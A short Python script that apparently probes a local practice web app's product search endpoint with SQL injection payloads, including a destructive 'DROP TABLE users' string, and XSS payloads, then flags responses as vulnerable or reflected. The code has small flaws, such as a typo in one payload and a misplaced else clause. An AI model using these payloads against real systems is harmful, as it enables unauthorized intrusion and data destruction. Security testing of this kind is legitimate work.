import requests
url = "http://127.0.0.1:3000/rest/products/search"
sqli_payloads = [ "' OR '1'='1","'Or 'a'='a","\"; DROP TABLE users;--"
]
xss_payloads = ["<script>alert('XSS')</script>","<img srx onerror=alert(1)>","<svg onload=alert('XSS')>"]

normal = requests.get(url, params={"q": "apple"}).text

payload_xss = "<script>alert('XSS')</script>"
xss = requests.get(url, params={"q":payload_xss}).text
print("===Normal Search===")
print(normal[:200])

for payload in sqli_payloads:
	res = requests.get(url, params={"q": payload}).text
	if len(res) > len(normal):
		print(f"[+] Payload '{payload}' => Vulnerable")
	else:
		print(f"[] Payload '{payload}' => Not Vulnerable")

print("\== XSS Test ===")
for payload in xss_payloads:
	res = requests.get(url, params={"q": payload}).text
	if payload in res:
		print(f"[+] Payload '{payload}' => Reflected (possible XSS)")
else:
	print(f"[] Payload '{payload}' => Not Reflected")
